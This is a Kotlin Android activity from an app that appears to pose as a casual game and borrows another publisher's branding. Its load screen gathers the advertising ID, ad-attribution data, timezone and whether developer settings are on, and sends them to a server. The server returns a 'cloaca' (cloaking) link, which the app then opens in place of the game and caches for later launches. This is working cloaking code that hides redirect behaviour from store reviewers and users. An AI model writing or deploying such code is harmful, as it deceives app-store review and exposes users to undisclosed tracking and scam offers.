package de.stollenmayer.philipp.Pop_1_1_Androi.presentation.activity

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import de.stollenmayer.philipp.Pop_1_1_Androi.data.ApiFactory
import de.stollenmayer.philipp.Pop_1_1_Androi.data.dto.AllData
import com.playrix.gardensca.databinding.ActivityLoadBinding
import de.stollenmayer.philipp.Pop_1_1_Androi.presentation.MyApplication
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.*

class LoadActivity : AppCompatActivity() {
    lateinit var binding: ActivityLoadBinding
    private var cloacaLink: String? = null

    private var redirectResponseData: String? = null
    private var adgroupId: String? = null
    private var engmntSource: String? = null
    private var retargetingConversionType: String? = null
    private var isIncentivized: String? = null
    private var origCost: String? = null
    private var isFirstLaunch: String? = null
    private var afClickLookback: String? = null
    private var afCpi: String? = null
    private var isCache: String? = null
    private var clickTime: String? = null
    private var isBrandedLink: String? = null
    private var matchType: String? = null
    private var adSet: String? = null
    private var afChannel: String? = null
    private var campaignId: String? = null
    private var installTime: String? = null
    private var agency: String? = null
    private var afSiteId: String? = null
    private var afStatus: String? = null
    private var afSub1: String? = null
    private var costCentsUSD: String? = null
    private var afSub5: String? = null
    private var afSub4: String? = null
    private var afSub3: String? = null
    private var afSub2: String? = null
    private var adSetId: String? = null
    private var espName: String? = null
    private var httpReferrer: String? = null
    private var isUniversalLink: String? = null
    private var isRetargeting: String? = null
    private var adgroup: String? = null
    private var googleId: String? = null
    var appsFlyerUserId: String? = null
    private var campaign: String? = null
    private var deepLink = "null"
    private var devTmz: String? = null
    private var adb: Boolean? = null
    private var mediaSource: String? = null


    private val user by lazy {
        this.getSharedPreferences("hasVisited", Context.MODE_PRIVATE)
    }
    private val visited by lazy { user.getBoolean("hasVisited", true) }


    private val link by lazy {
        this.getSharedPreferences("link", Context.MODE_PRIVATE)
    }
    private val haveLink by lazy { link.getString("link", "") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityLoadBinding.inflate(layoutInflater)
        setContentView(binding.root)
        startWork()
    }

    /**
     * Запускаю инициализацию и открываю новое окно
     */
    private fun startWork() {

        if (visited) {
            lifecycleScope.launch(Dispatchers.IO) {
                getGoogleID()
                startInitialFb()
                withContext(Dispatchers.Main) {
                    getAppsFlyerParams()
                }
            }
            user.edit().putBoolean("hasVisited", false).apply()
        } else {
            if (haveLink.isNullOrEmpty()) {
                startActivity(Intent(this, MenuActivity::class.java))
            } else {
                Intent(this, SecondsActivity::class.java).apply {
                    putExtra("link", haveLink)
                    startActivity(this)
                }
            }
        }
    }


    private fun startInitialFb() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(
            this
        ) {
            deepLink = it?.targetUri.toString()
        }
    }

    /**
     * Получаю id google
     */
    private fun getGoogleID() {
        googleId = AdvertisingIdClient.getAdvertisingIdInfo(this).id.toString()
        googleId?.let {
            OneSignal.setExternalUserId(it)
        }
    }


    /**
     * Получаю параметры с AppsFlyer
     */
    private fun getAppsFlyerParams() {
        appsFlyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
        MyApplication.liveDataAppsFlyer.observe(this) {
            for (inform in it) {
                when (inform.key) {
                    "campaign" -> { campaign = inform.value?.toString() }
                    "media_source" -> { mediaSource = inform.value?.toString() }
                    "redirect_response_data" -> { redirectResponseData = inform.value?.toString() }
                    "adgroup_id" -> { adgroupId = inform.value?.toString() }
                    "engmnt_source" -> { engmntSource = inform.value?.toString() }
                    "retargeting_conversion_type" -> { retargetingConversionType = inform.value?.toString() }
                    "is_incentivized" -> { isIncentivized = inform.value?.toString() }
                    "orig_cost" -> { origCost = inform.value?.toString() }
                    "is_first_launch" -> { isFirstLaunch = inform.value?.toString() }
                    "af_click_lookback" -> { afClickLookback = inform.value?.toString() }
                    "af_cpi" -> { afCpi = inform.value?.toString() }
                    "iscache" -> { isCache = inform.value?.toString() }
                    "click_time" -> { clickTime = inform.value?.toString() }
                    "is_branded_link" -> { isBrandedLink = inform.value?.toString() }
                    "match_type" -> { matchType = inform.value?.toString() }
                    "adset" -> { adSet = inform.value?.toString() }
                    "af_channel" -> { afChannel = inform.value?.toString() }
                    "campaign_id" -> { campaignId = inform.value?.toString() }
                    "install_time" -> { installTime = inform.value?.toString() }
                    "agency" -> { agency = inform.value?.toString() }
                    "af_siteid" -> { afSiteId = inform.value?.toString() }
                    "af_status" -> { afStatus = inform.value?.toString() }
                    "af_sub1" -> { afSub1 = inform.value?.toString() }
                    "cost_cents_USD" -> { costCentsUSD = inform.value?.toString() }
                    "af_sub5" -> { afSub5 = inform.value?.toString() }
                    "af_sub4" -> { afSub4 = inform.value?.toString() }
                    "af_sub3" -> { afSub3 = inform.value?.toString() }
                    "af_sub2" -> { afSub2 = inform.value?.toString() }
                    "adset_id" -> { adSetId = inform.value?.toString() }
                    "esp_name" -> { espName = inform.value?.toString() }
                    "http_referrer" -> { httpReferrer = inform.value?.toString() }
                    "is_universal_link" -> { isUniversalLink = inform.value?.toString() }
                    "is_retargeting" -> { isRetargeting = inform.value?.toString() }
                    "adgroup" -> { adgroup = inform.value?.toString() }
                }
            }
            getSystemicData()
            setDataServer()
        }
    }

    private fun getSystemicData() {
        devTmz = TimeZone.getDefault().id
        adb = Settings.Secure.getInt(applicationContext.contentResolver,
            Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0) != 0
    }

    /**
     * Отправляю данные на сервен
     */
    private fun setDataServer(){
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val allData = AllData(
                    googleId = googleId, appsFlyerUserId = appsFlyerUserId, campaign = campaign,
                    deepLink = deepLink, devTmz = devTmz, adb = adb, media_source = mediaSource,
                    redirect_response_data = redirectResponseData, adgroup_id = adgroupId, engmnt_source = engmntSource,
                    retargeting_conversion_type = retargetingConversionType, is_incentivized = isIncentivized,
                    orig_cost = origCost, is_first_launch = isFirstLaunch, af_click_lookback = afClickLookback,
                    af_cpi = afCpi, iscache = isCache, click_time = clickTime, is_branded_link = isBrandedLink,
                    match_type = matchType, adset = adSet, af_channel = afChannel, campaign_id = campaignId,
                    install_time = installTime, agency = agency, af_siteid = afSiteId, af_status = afStatus,
                    af_sub1 = afSub1, cost_cents_USD = costCentsUSD, af_sub5 = afSub5, af_sub4 = afSub4,
                    af_sub3 = afSub3, af_sub2 = afSub2, adset_id = adSetId, esp_name = espName, http_referrer = httpReferrer,
                    is_universal_link = isUniversalLink, is_retargeting = isRetargeting, adgroup = adgroup
                )
                Log.d("test4", "$allData")
                lifecycleScope.launch {
                    cloacaLink = ApiFactory(this@LoadActivity).create().setDataServer(allData).offerLink
                    nextScreen()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@LoadActivity, "No Internet!", Toast.LENGTH_LONG).show()
                }
                Log.d("errorGetData", "$e")
            }
        }
    }

    /**
     * Открываю или игру или вебвью
     */
    private fun nextScreen() {
        if (cloacaLink == null || cloacaLink == "error") {
            startActivity(Intent(this, MenuActivity::class.java))
        } else {
            Intent(this, SecondsActivity::class.java).apply {
                link.edit().putString("link", "$cloacaLink").apply()
                putExtra("link", cloacaLink)
                startActivity(this)
            }
        }
    }
}